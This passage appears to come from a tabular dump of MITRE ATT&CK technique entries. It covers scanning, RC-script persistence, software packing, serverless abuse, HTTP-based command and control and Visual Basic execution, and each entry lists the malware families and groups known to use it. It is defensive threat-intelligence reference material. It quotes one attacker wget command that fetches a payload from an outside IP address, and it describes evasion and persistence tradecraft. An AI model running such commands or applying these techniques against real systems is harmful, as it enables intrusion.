T1595.001,Scanning IP Blocks,"Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.  Adversaries may scan IP blocks in order to [Gather Victim Network Information] such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains] or [Search Open Technical Databases] establishing operational resources (ex: [Develop Capabilities] or [Obtain Capabilities] and/or initial access (ex: [External Remote Services]",['[TeamTNT] has scanned specific lists of target IP addresses.'],
T1037.004,RC Scripts,"Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.  Adversaries can establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution. Upon reboot, the system executes the script's contents as root, resulting in persistence.  Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.  Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd]  This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts. To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.","['[HiddenWasp] installs reboot persistence by adding itself to <code>/etc/rc.local</code>.', '[APT29] has installed a run command on a compromised system to enable malware execution on system startup.', '[Green Lambert] can add <code>init.d</code> and <code>rc.d</code> files in the <code>/etc</code> folder to establish persistence. ', '[Cyclops Blink] has the ability to execute on device startup, using a modified RC script named S51armled.', '[iKitten] adds an entry to the rc.common file for persistence.']",False
T1027.002,Software Packing,"Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.   Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  ","['[GoldMax] has been packed for obfuscation.', '[Lokibot] has used several packing methods for obfuscation.', '[Cuba] has a packed payload when delivered. ', '[VERMIN] is initially packed.', '[China Chopper] client component is packed with UPX.', 'During [C0017] [APT41] used VMProtect to slow the reverse engineering of malicious binaries.', '[Raindrop] used a custom packer for its [Cobalt Strike] payload, which was compressed using the LZMA algorithm.', '[The White Company] has obfuscated their payloads through packing.', '[Uroburos] uses a custom packer.', '[Spark] has been packed with Enigma Protector to obfuscate its contents. ', '[TA2541] has used a .NET packer to obfuscate malicious files.', '[NETWIRE] has used .NET packer tools to evade detection.', '[Machete] has been packed with NSIS. ', '[AppleSeed] has used UPX packers for its payload DLL.', 'A version of [Daserf] uses the MPRESS packer.', '[APT41] uses packers such as Themida to obfuscate malicious files.', '[Dok] is packed with an UPX executable packer.', '[Dark Caracal] has used UPX to pack [Bandook]', '[KONNI] has been packed for obfuscation.', 'During [Night Dragon] threat actors used software packing in its tools.', 'For [Operation Spalax] the threat actors used a variety of packers, including CyaX, to obfuscate malicious executables.', '[Astaroth] uses a software packer called Pe123\\RPolyCryptor.', '[Aoqin Dragon] has used the Themida packer to obfuscate malicious payloads.', '[Trojan.Karagany] samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer.', '[MoustachedBouncer] has used malware plugins packed with Themida.', 'A [FinFisher] variant uses a custom packer.', '[APT39] has packed tools with UPX, and has repacked a modified version of [Mimikatz] to thwart anti-virus detection.', 'Versions of [Babuk] have been packed.', '[Hildegard] has packed ELF files into other binaries.', '[Egregor] payloads are custom-packed, archived and encrypted to prevent analysis.', '[TA505] has used UPX to obscure malicious code.', 'For [Operation Dust Storm] the threat actors used UPX to pack some payloads.', '[TrickBot] leverages a custom packer to obfuscate its functionality.', '[Lucifer] has used UPX packed binaries.', '[GALLIUM] packed some payloads using different types of packers, both known and custom.', '[Donut] can generate packed code modules.\t', '[TeamTNT] has used UPX and Ezuri packer to pack its binaries.', '[APT38] has used several code packing methods such as Themida, Enigma, VMProtect, and Obsidium, to pack their implants.', '[SDBbot] has used a packed installer file.', '[Tomiris] has been packed with UPX.', '[CostaBricks] can implement a custom-built virtual machine mechanism to obfuscate its code.', '[Clop] has been packed to help avoid detection.', '[FatDuke] has been regularly repacked by its operators to create large binaries and evade detection.', '[Saint Bot] has been packed using a dark market crypter.', '[Torisma] has been packed with Iz4 compression.', '[HotCroissant] has used the open source UPX executable packer.', '[BLINDINGCAN] has been packed with the UPX packer.', '[Rocke] miner has created UPX-packed files in the Windows Start Menu Folder.', '[OSX_OCEANLOTUS.D] has a variant that is packed with UPX.', '[Ember Bear] has packed malware to help avoid detection.', 'A [Patchwork] payload was packed with UPX.', '[jRAT] payloads have been packed.', '[Zebrocy] Delphi variant was packed with UPX.', '[SeaDuke] has been packed with the UPX packer.', 'The first stage of [COATHANGER] is delivered as a packed file.', '[HyperBro] has the ability to pack its payload.', 'Some [S-Type] samples have been packed with UPX.', '[LiteDuke] has been packed with multiple layers of encryption.', '[H1N1] uses a custom packing algorithm.', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] used UPX to pack a copy of [Mimikatz]', '[Valak] has used packed DLL payloads.', '[DRATzarus] dropper can be packed with UPX.', '[Kimsuky] has packed malware with UPX.', '[ShimRat] loader has been packed with the compressed [ShimRat] core DLL and the legitimate DLL for it to hijack.', '[ZIRCONIUM] has used multi-stage packers for exploit code.', '[Bisonal] has used the MPRESS packer and similar tools for obfuscation. ', 'During [Operation Dream Job] [Lazarus Group] packed malicious .db files with Themida to evade detection.', 'Some [ZeroT] DLL files have been packed with UPX.', '[Squirrelwaffle] has been packed with a custom packer to hide payloads.', '[DarkComet] has the option to compress its payload using UPX or MPRESS.', '[GreyEnergy] is packed for obfuscation.', '[Dyre] has been delivered with encrypted resources and must be unpacked for execution.', '[Melcoz] has been packed with VMProtect and Themida.', '[Metamorfo] has used VMProtect to pack and protect files. ', '[Threat Group-3390] has packed malware and tools, including using VMProtect.', '[yty] packs a plugin with UPX.', '[Emotet] has used custom packers to protect its payloads.', '[OopsIE] uses the SmartAssembly obfuscator to pack an embedded .Net Framework assembly used for C2.', '[CSPY Downloader] has been packed with UPX.', '[SysUpdate] has been packed with VMProtect.', '[Mongall] has been packed with Themida.', '[Misdat] was typically packed using UPX.', '[FYAnti] has used ConfuserEx to pack its .NET module.', '[QakBot] can encrypt and pack malicious payloads.', '[IcedID] has packed and encrypted its loader module.', '[APT3] has been known to pack their tools. ', '[Anchor] has come with a packed payload.', '[Elderwood] has packed malware payloads before delivery to victims.', '[Bazar] has a variant with a packed payload.', '[APT29] used UPX to pack files.', '[Lazarus Group] has used Themida to pack malicious DLLs and other files.', '[Sandworm Team] used UPX to pack a copy of [Mimikatz] ', '[Night Dragon] is known to use software packing in its tools.', '[Lazarus Group] has used Themida to pack at least two separate backdoor implants.']",False
T1584.007,Serverless,"Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.   Once compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy] traffic to an adversary-owned command and control server. As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.",[],False
T1071.001,Web Protocols,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.   Protocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ","['[Mori] can communicate using HTTP over IPv4 or IPv6 depending on a flag set.', '[UPPERCUT] has used HTTP for C2, including sending error codes in Cookie headers.', '[RDAT] can use HTTP communications for C2, as well as using the WinHTTP library to make requests to the Exchange Web Services API.', '[PULSECHECK] can check HTTP request headers for a specific backdoor key and if found will output the result of the command in the variable `HTTP_X_CMD.`', '[Vasport] creates a backdoor by making a connection using a HTTP POST.', '[Drovorub] can use the WebSocket protocol and has initiated communication with C2 servers with an HTTP Upgrade request.', '[ChChes] communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.', '[CreepyDrive] can use HTTPS for C2 using the Microsoft Graph API.', '[Epic] uses HTTP and HTTPS for C2 communications.', '[Mongall] can use HTTP for C2 communication.', '[Xbash] uses HTTP for C2 communications.', '[SUPERNOVA] had to receive an HTTP GET request containing a specific set of parameters in order to execute.', '[LIGHTWIRE] can use HTTP for C2 communications.', '[xCaon] has communicated with the C2 server by sending POST requests over HTTP. ', '[Rancor] has used HTTP for C2.', '[KEYPLUG] has the ability to communicate over HTTP and WebSocket Protocol (WSS) for C2.', '[QUADAGENT] uses HTTPS and HTTP for C2 communications.', '[Metador] has used HTTP for C2.', '[Kinsing] has communicated with C2 over HTTP.', '[BADNEWS] establishes a backdoor over HTTP.', '[BITTER] has used HTTP POST requests for C2.', '[Bankshot] uses HTTP for command and control communication.', '[MacSpy] uses HTTP for command and control.', '[LOWBALL] command and control occurs via HTTPS over port 443.', '[QuietSieve] can use HTTPS in C2 communications.', '[POWRUNER] can use HTTP for C2 communications.', '[OilRig] has used HTTP for C2.', '[CORESHELL] can communicate over HTTP for C2.', '[Metamorfo] has used HTTP for C2. ', '[PoshC2] can use protocols like HTTP/HTTPS for command and control traffic.', '[ComRAT] has used HTTP requests for command and control.', '[BLINDINGCAN] has used HTTPS over port 443 for command and control.', '[More_eggs] uses HTTPS for C2.', '[Proxysvc] uses HTTP over SSL to communicate commands with the control server.', '[Crutch] has conducted C2 communications with a Dropbox account using the HTTP API.', '[PcShare] has used HTTP for C2 communication.', '[Orangeworm] has used HTTP for C2.', '[Out1] can use HTTP and HTTPS in communications with remote hosts.', '[APT37] uses HTTPS to conceal C2 communications.', 'The [Carbanak] malware communicates to its command server using HTTP with an encrypted payload.', '[SNUGRIDE] communicates with its C2 server over HTTP.', '[PLEAD] has used HTTP for communications with command and control (C2) servers.', '[VERMIN] uses HTTP for C2 communications.', '[CozyCar] main method of communicating with its C2 servers is using HTTP or HTTPS.', '[Dark Caracal] version of [Bandook] communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string “&&&”.', '[SLOTHFULMEDIA] has used HTTP and HTTPS for C2 communications.', '[EvilBunny] has executed C2 commands directly via HTTP.', '[China Chopper] server component executes code sent via HTTP POST commands.', '[FatDuke] can be controlled via a custom C2 protocol over HTTP.', '[Hi-Zor] communicates with its C2 server over HTTPS.', '[pngdowner] uses HTTP for command and control.', '[Ixeshe] uses HTTP for command and control.', '[DustySky] has used both HTTP and HTTPS for C2.', '[TSCookie] can multiple protocols including HTTP and HTTPS in communication with command and control (C2) servers.', '[BUBBLEWRAP] can communicate using HTTP or HTTPS.', '[3PARA RAT] uses HTTP for command and control.', '[BlackMould] can send commands to C2 in the body of HTTP POST requests.', '[Magic Hound] has used HTTP for C2.', '[Peppy] can use HTTP to communicate with C2.', '[Diavol] has used HTTP GET and POST requests for C2.', '[Winnti for Linux] has used HTTP in outbound communications.', 'The [Regin] malware platform supports many standard protocols, including HTTP and HTTPS.', '[ThiefQuest] uploads files via unencrypted HTTP. ', '[Tomiris] can use HTTP to establish C2 communications.', '[Ramsay] has used HTTP for C2.', ""[FRAMESTING] can retrieve C2 commands from values stored in the `DSID` cookie from the current HTTP request or from decompressed zlib data within the request's `POST` data."", '[RainyDay] can use HTTP in C2 communications.', '[Tropic Trooper] has used HTTP in communication with the C2.', '[Taidoor] has used HTTP GET and POST requests for C2.', '[ZxShell] has used HTTP for C2 connections. ', '[Action RAT] can use HTTP to communicate with C2 servers.', '[CreepySnail] can use HTTP for C2.', '[LiteDuke] can use HTTP GET requests in C2 communications.', '[KONNI] has used HTTP POST for C2.', '[BadPatch] uses HTTP for C2.', '[Seasalt] uses HTTP for C2 communications.', '[Keydnap] uses HTTPS for command and control.', 'A [PingPull] variant can communicate with its C2 servers by using HTTPS.', '[Chimera] has used HTTPS for C2 communications.', '[Okrum] uses HTTP for communication with its C2.', 'Various implementations of [CHOPSTICK] communicate with C2 over HTTP.', '[PinchDuke] transfers files from the compromised host via HTTP or HTTPS to a C2 server.', '[Dacls] can use HTTPS in C2 communications.', '[Sakula] uses HTTP for C2.', '[Saint Bot] has used HTTP for C2 communications.', '[POWERTON] has used HTTP/HTTPS for C2 traffic.', '[Mythic] supports HTTP-based C2 profiles.\t', '[ServHelper] uses HTTP for C2.', '[Valak] has used HTTP in communications with C2.', 'One variant of [CloudDuke] uses HTTP and HTTPS for C2.', '[GravityRAT] uses HTTP for C2.', '[DEATHRANSOM] can use HTTPS to download files.', '[Dridex] has used POST requests and HTTPS for C2 communications.', '[AppleJeus] has sent data to its C2 server via <code>POST</code> requests.', '[ANDROMEDA] has the ability to make GET requests to download files from C2.', '[Exaramel for Linux] uses HTTPS for C2 communications.', '[4H RAT] uses HTTP for command and control.', 'The ""Uploader"" variant of [HAMMERTOSS] visits a hard-coded server over HTTP/S to download the images [HAMMERTOSS] uses to receive commands.', 'During [Operation Wocao] threat actors’ XServer tool communicated using HTTP and HTTPS.', '[HAWKBALL] has used HTTP to communicate with a single hard-coded C2 server.', '[Smoke Loader] uses HTTP for C2.', '[LuminousMoth] has used HTTP for C2.', '[KOPILUWAK] has used HTTP POST requests to send data to C2.', '[Uroburos] can use a custom HTTP-based protocol for large data communications that can blend with normal network traffic by riding on top of standard HTTP.', '[Felismus] uses HTTP for C2.', '[BoomBox] has used HTTP POST requests for C2.', '[P.A.S. Webshell] can issue commands via HTTP POST.', '[GreyEnergy] uses HTTP and HTTPS for C2 communications.', '[Aria-body] has used HTTP in C2 communications.', '[Helminth] can use HTTP for C2.', '[JHUHUGIT] variants have communicated with C2 servers over HTTP and HTTPS.', '[APT19] used HTTP for C2 communications. [APT19] also used an HTTP malware variant to communicate over HTTP for C2.', '[APT41] used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits. ', '[SoreFang] can use HTTP in C2 communications.', '[Mustang Panda] has communicated with its C2 via HTTP POST requests.', '[S-Type] uses HTTP for C2.', '[HyperBro] has used HTTPS for C2 communications.', '[RGDoor] uses HTTP for C2 communications.', '[Emotet] has used HTTP for command and control.', '[Pteranodon] can use HTTP for C2.', '[ABK] has the ability to use HTTP in communications with C2.', '[FELIXROOT] uses HTTP and HTTPS to communicate with the C2 server.', '[BADHATCH] can use HTTP and HTTPS over port 443 to communicate with actor-controlled C2 servers. ', '[Koadic] has used HTTP for C2 communications.', '[APT38] used a backdoor, QUICKRIDE, to communicate to the C2 server over HTTP and HTTPS.', '[BACKSPACE] uses HTTP as a transport to communicate with its command server.', '[RATANKBA] uses HTTP/HTTPS for command and control communication.', '[BBK] has the ability to use HTTP in communications with C2.', '[Psylo] uses HTTPS for C2.', '[BRONZE BUTLER] malware has used HTTP for C2.', '[SVCReady] can communicate with its C2 servers via HTTP.', '[WindTail] has the ability to use HTTP for C2 communications.', '[MechaFlounder] has the ability to use HTTP in communication with C2.', '[FoggyWeb] has the ability to communicate with C2 servers over HTTP GET/POST requests.', '[QakBot] has the ability to use HTTP and HTTPS in communication with C2 servers.', '[Agent Tesla] has used HTTP for C2 communications.', '[Crimson] can use a HTTP GET request to download its final payload.', '[Sidewinder] has used HTTP in C2 communications.', '[Gazer] communicates with its C2 servers over HTTP.', '[NETEAGLE] will attempt to detect if the infected host is configured to a proxy. If so, [NETEAGLE] will send beacons via an HTTP POST request. [NETEAGLE] will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2.', '[WhisperGate] can make an HTTPS connection to download additional files.', '[UBoatRAT] has used HTTP for C2 communications.', '[CSPY Downloader] can use GET requests to download additional payloads from C2.', '[Kimsuky]  has used HTTP GET and POST requests for C2.', '[STARWHALE] has the ability to contact actor-controlled C2 servers via HTTP.', 'During [Frankenstein] the threat actors used HTTP GET requests for C2.', '[Lazarus Group] has conducted C2 over HTTP and HTTPS.', '[Avenger] has the ability to use HTTP in communication with C2.', '[AuTo Stealer] can use HTTP to communicate with its C2 servers.', '[Remexi] uses [BITSAdmin] to communicate with the C2 server over HTTP.', '[PlugX] can be configured to use HTTP for command and control.', '[OSX_OCEANLOTUS.D] can also use use HTTP POST and GET requests to send and receive C2 information.', '[OopsIE] uses HTTP for C2 communications.', '[Zebrocy] uses HTTP for C2.', '[PoetRAT] has used HTTP and HTTPs for C2 communications.', '[SMOKEDHAM] has communicated with its C2 servers via HTTPS and HTTP POST requests.', '[StrongPity] can use HTTP and HTTPS in C2 communications.', '[Pandora] can communicate over HTTP.', '[Donut] can use HTTP to download previously staged shellcode payloads.', '[SpeakUp] uses POST and GET requests over HTTP to communicate with its main C&C server. ', '[Higaisa] used HTTP and HTTPS to send data back to its C2 server.', '[Milan] can use HTTPS for communication with C2.', '[Emissary] uses HTTP or HTTPS for C2.', '[Anchor] has used HTTP and HTTPS in C2 communications.', 'During [C0017] [APT41] ran `wget http://103.224.80[.]44:8080/kernel` to download malicious payloads. ', '[MCMD] can use HTTPS in communication with C2 web servers.', '[ELMER] uses HTTP for command and control.', '[MuddyWater] has used HTTP for C2 communications.', '[Mafalda] can use HTTP for C2.', '[Stealth Falcon] malware communicates with its C2 server via HTTPS.', '[LookBack] C2 proxy tool sends data to a C2 server over HTTP.', '[YAHOYAH] uses HTTP for C2.', '[APT32] has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks. The group has also used downloaded encrypted payloads over HTTP.', '[Squirrelwaffle] has used HTTP POST requests for C2 communications.', 'Some [Reaver] variants use HTTP for C2.', '[DanBot] can use HTTP in C2 communication.', '[Rising Sun] has used HTTP and HTTPS for command and control.', 'During [Night Dragon] threat actors used HTTP for C2.', '[NGLite] will initially beacon out to the NKN network via an HTTP POST over TCP 30003.', '[RCSession] can use HTTP in C2 communications.', '[Comnie] uses HTTP for C2 communication.', '[Inception] has used HTTP, HTTPS, and WebDav in network communications.', '[BBSRAT] uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.', '[WIRTE] has used HTTP for network communication.\t', '[ShimRat] communicated over HTTP and HTTPS with C2 servers.', '[Dyre] uses HTTPS for C2 communications.\t ', '[Stuxnet] uses HTTP to communicate with a command and control server. ', '[Turla] has used HTTP and HTTPS for C2 communications.', '[Dipsind] uses HTTP for C2.', '[Pupy] can communicate over HTTP for C2.', '[Flagpro] can communicate with its C2 using HTTP. ', '[FIN13] has used HTTP requests to chain multiple web shells and to contact actor-controlled C2 servers prior to exfiltrating stolen data.', '[SLIGHTPULSE] has the ability to process HTTP GET requests as a normal web server and to insert logic that will read or write files or execute commands in response to HTTP POST requests.', '[Machete] uses HTTP for Command & Control.', '[SilverTerrier] uses HTTP for C2 communications.\t', 'Later implants used by [APT28] such as [CHOPSTICK] use a blend of HTTP, HTTPS, and other legitimate channels for C2, depending on module configuration.', 'During [C0021] the threat actors used HTTP for some of their C2 communications.', '[Torisma] can use HTTP and HTTPS for C2 communications.', '[Bisonal] has used HTTP for C2 communications.', '[SideTwist] has used HTTP GET and POST requests over port 443 for C2.', '[Goopy] has the ability to communicate with its C2 over HTTP.\t', '[Hikit] has used HTTP for C2.', ' [Sliver] has the ability to support C2 communications over HTTP/S.', '[Final1stspy] uses HTTP for C2.', '[GoldenSpy] has used the Ryeol HTTP Client to facilitate HTTP internet communication.', '[TrailBlazer] has used HTTP requests for C2.', 'Variants of [Kevin] can communicate with C2 over HTTP.', '[CharmPower] can use HTTP to communicate with C2.', '[Wizard Spider] has used HTTP for network communications.', '[DarkWatchman] uses HTTPS for command and control.', '[Ursnif] has used HTTPS for C2.', '[Empire] can conduct command and control over protocols like HTTP and HTTPS.', '[ADVSTORESHELL] connects to port 80 of a C2 server using Wininet API. Data is exchanged via HTTP POSTs.', '[FlawedAmmyy] has used HTTP for C2.', '[Mis-Type] network traffic can communicate over HTTP.', '[Doki] has communicated with C2 over HTTPS.', '[Maze] has communicated to hard-coded IP addresses via HTTP.', '[metaMain] can use HTTP for C2 communications.', '[LitePower] can use HTTP and HTTPS for C2 communications.', '[WinMM] uses HTTP for C2.', '[Woody RAT] can communicate with its C2 server using HTTP requests.', '[SeaDuke] uses HTTP and HTTPS for C2.', '[njRAT] has used HTTP for C2 communications.', '[Micropsia] uses HTTP and HTTPS for C2 network communications.', '[FIN8] has used HTTPS for command and control.', '[KGH_SPY] can send data to C2 with HTTP POST requests.', '[PolyglotDuke] has has used HTTP GET requests in C2 communications.', '[Cobalt Strike] can use a custom command and control protocol that can be encapsulated in HTTP or HTTPS. All protocols use their standard assigned ports.', '[PowerShower] has sent HTTP GET and POST requests to C2 servers to send information and receive instructions.', '[httpclient] uses HTTP for command and control.', '[ZeroT] has used HTTP for C2.', '[Confucius] has used HTTP for C2 communications.', '[Pony] has sent collected information to the C2 via HTTP POST request.\t', '[PowGoop] can send HTTP GET requests to malicious servers.', '[Industroyer] main backdoor connected to a remote C2 server using HTTPS.', '[CosmicDuke] can use HTTP or HTTPS for command and control to hard-coded C2 servers.', '[Carbon] can use HTTP in C2 communications.', '[Explosive] has used HTTP for communication.', '[COATHANGER] uses an HTTP GET request to initialize a follow-on TLS tunnel for command and control.', '[Kazuar] uses HTTP and HTTPS to communicate with the C2 server. [Kazuar] can also act as a webserver and listen for inbound HTTP requests through an exposed API.', '[Windshift] has used tools that communicate with C2 over HTTP.', '[PUNCHBUGGY] enables remote interaction and can obtain additional code over HTTPS GET and POST requests.', '[HTTPBrowser] has used HTTP and HTTPS for command and control.', '[RTM] has initiated connections to external domains using HTTPS.\t', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] used [BlackEnergy] to communicate between compromised hosts and their command-and-control servers via HTTP post requests. ', '[Cobalt Group] has used HTTPS for C2.', '[Zeus Panda] uses HTTP for C2 communications.', '[GoldMax] has used HTTPS and HTTP GET requests with custom HTTP cookies for C2.', '[OnionDuke] uses HTTP and HTTPS for C2.', '[DarkComet] can use HTTP for C2 communications.', '[Octopus] has used HTTP GET and POST requests for C2 communications.', '[GeminiDuke] uses HTTP and HTTPS for command and control.', '[GuLoader] can use HTTP to retrieve additional binaries.', '[Chaes] has used HTTP for C2 communications.', '[Turian] has the ability to use HTTP for its C2.', 'During [Operation CuckooBees] the threat actors enabled HTTP and HTTPS listeners.', 'During [Operation Dream Job] [Lazarus Group] uses HTTP and HTTPS to contact actor-controlled C2 servers. ', '[DRATzarus] can use HTTP or HTTPS for C2 communications.', '[IcedID] has used HTTPS in communications with C2.', '[REvil] has used HTTP and HTTPS in communication with C2.', '[Elise] communicates over HTTP or HTTPS for C2.', '[down_new] has the ability to use HTTP in C2 communications.', '[BLUELIGHT] can use HTTP/S for C2 using the Microsoft Graph API. ', '[APT33] has used HTTP for command and control.', '[TA551] has used HTTP for C2 communications.', '[QUIETCANARY] can use HTTPS for C2 communications.', '[Egregor] has communicated with its C2 servers via HTTPS protocol.', '[VBShower] has attempted to obtain a VBS script from command and control (C2) nodes over HTTP.', '[IceApple] can use HTTP GET to request and pull information from C2.', '[Shark] has the ability to use HTTP in C2 communications.', '[AppleSeed] has the ability to communicate with C2 over HTTP.', '[Gold Dragon] uses HTTP for communication to the control servers.', '[Bazar] can use HTTP and HTTPS over ports 80 and 443 in C2 communications.', '[BackConfig] has the ability to use HTTPS for C2 communiations.', '[RedLeaves] can communicate to its C2 over HTTP and HTTPS if directed.', '[Carberp] has connected to C2 servers via HTTP.', '[Clambling] has the ability to communicate over HTTP.', '[APT12] has used [RIPTIDE] a RAT that uses HTTP to communicate.', '[NOKKI] has used HTTP for C2 communications.', '[Gamaredon Group] has used HTTP and HTTPS for C2 communications.', '[ShadowPad] communicates over HTTP to retrieve a string that is decoded into a C2 server URL.', '[Sys10] uses HTTP for C2.', 'During [C0018] the threat actors used HTTP for C2 communications.', '[MarkiRAT] can initiate communication over HTTP/HTTPS for its C2 server.', '[OLDBAIT] can use HTTP for C2.', '[Ke3chang] malware including RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2.', 'The [Komplex] C2 channel uses HTTP POST requests.', '[Gelsemium] can use HTTP/S in C2 communications.', '[FIN4] has used HTTP POST requests to transmit data.', 'A [SUGARDUMP] variant has used HTTP for C2.', '[Cardinal RAT] is downloaded using HTTP over port 443.', '[OwaAuth] uses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions.', '[OutSteel] has used HTTP for C2 communications.', '[Daserf] uses HTTP for C2.', '[NETWIRE] has the ability to communicate over HTTP.', '[Ninja] can use HTTP for C2 communications.', '[DownPaper] communicates to its C2 server over HTTP.', '[APT18] uses HTTP for C2 communications.', '[Remsec] is capable of using HTTP and HTTPS for C2.', '[APT39] has used HTTP in communications with C2.', '[MiniDuke] uses HTTP and HTTPS for command and control.', '[Threat Group-3390] malware has used HTTP for C2.', '[Get2] has the ability to use HTTP to send information collected from an infected host to C2.', '[Winnti for Windows] has the ability to use encapsulated HTTP/S in C2 communications.', '[HAFNIUM] has used open-source C2 frameworks, including Covenant.', '[WIREFIRE] can respond to specific HTTP `POST` requests to `/api/v1/cav/client/visits`.', '[STEADYPULSE] can parse web requests made to a targeted server to determine the next stage of execution.', '[Samurai] can use a .NET HTTPListener class to receive and handle HTTP POST requests.', '[Lokibot] has used HTTP for C2 communications. ', '[Small Sieve] can contact actor-controlled C2 servers by using the Telegram API over HTTPS.', '[InvisiMole] uses HTTP for C2 communications.', '[ShimRatReporter] communicated over HTTP with preconfigured C2 servers.', '[Grandoreiro] has the ability to use HTTP in C2 communications.', '[GoldFinder] has used HTTP for C2.', '[Neoichor] can use HTTP for C2 communications.', '[Cyclops Blink] can download files via HTTP and HTTPS.', '[Amadey] has used HTTP for C2 communications.', '[TinyTurla] can use HTTPS in C2 communications.', '[TeamTNT] has the `curl` command to send credentials over HTTP and the `curl` and `wget` commands to download new software. [TeamTNT] has also used a custom user agent HTTP header in shell scripts.', '[Rocke] has executed wget and curl commands to Pastebin over the HTTPS protocol.', '[TrickBot] uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files.', '[Trojan.Karagany] can communicate with C2 via HTTP POST requests.', '[VaporRage] can use HTTP to download shellcode from compromised websites.', '[SUNBURST] communicated via HTTP GET or HTTP POST requests to third party servers for C2.', '[GrimAgent] has the ability to use HTTP for C2 communications.', '[Shamoon] has used HTTP for C2.', '[WellMess] can use HTTP and HTTPS in C2 communications.', '[DealersChoice] uses HTTP for communication with the C2 server.', '[Spark] has used HTTP POST requests to communicate with its C2 server to receive commands. ', '[ROKRAT] can use HTTP and HTTPS for command and control communication.', '[BlackEnergy] communicates with its C2 server over HTTP.', '[Sandworm Team] BCS-server tool connects to the designated C2 server via HTTP.\t', '[TA505] has used HTTP to communicate with C2 nodes.', '[ZLib] communicates over HTTP for C2.', '[Bundlore] uses HTTP requests for C2.', '[Sibot] communicated with its C2 server via HTTP GET requests.', 'During the [SolarWinds Compromise] [APT29] used HTTP for C2 and data exfiltration.', '[Brute Ratel C4] can use HTTPS and HTTPS for C2 communication.', '[DarkTortilla] has used HTTP and HTTPS for C2.', '[UNC2452] used HTTP for C2 and data exfiltration.', '[APT29] has used HTTP for C2 and data exfiltration.', '[Night Dragon] has used HTTP for C2.', '[Cobalt Strike] uses a custom command and control protocol that can be encapsulated in HTTP or HTTPS, or DNS. All protocols use their standard assigned ports.\t', '[Machete] malware used Python’s urllib library to make HTTP requests to the C2 server.']",False
T1059.005,Visual Basic,"Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model] and the [Native API] through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.  Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript] on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).  Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment] payloads (which may also involve [Mark-of-the-Web Bypass] to enable execution).","['[Lokibot] has used VBS scripts and XLS macros for execution. ', '[Patchwork] used Visual Basic Scripts (VBS) on victim machines.', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] created VBScripts to run on an SSH server.', '[Grandoreiro] can use VBScript to execute malicious code.', '[BackConfig] has used VBS to install its downloader component and malicious documents with VBA macro code.', '[Squirrelwaffle] has used malicious VBA macros in Microsoft Word documents and Excel spreadsheets that execute an `AutoOpen` subroutine. ', '[Koadic] performs most of its operations using Windows Script Host (VBScript) and runs arbitrary shellcode .', ""[Higaisa] has used VBScript code on the victim's machine."", '[Kerrdown] can use a VBS base64 decoder function published by Motobit.', '[Goopy] has the ability to use a Microsoft Outlook backdoor macro to communicate with its C2.\t', '[FIN4] has used VBA macros to display a dialog box and collect victim credentials.', '[WIRTE] has used VBScript  in its operations.\t', '[Windshift] has used Visual Basic 6 (VB6) payloads.', '[Turla] has used VBS scripts throughout its operations.\t', '[jRAT] has been distributed as HTA files with VBScript.\t', '[SVCReady] has used VBA macros to execute shellcode.', 'During [Operation Dream Job] [Lazarus Group] executed a VBA written malicious macro after victims download malicious DOTM files; 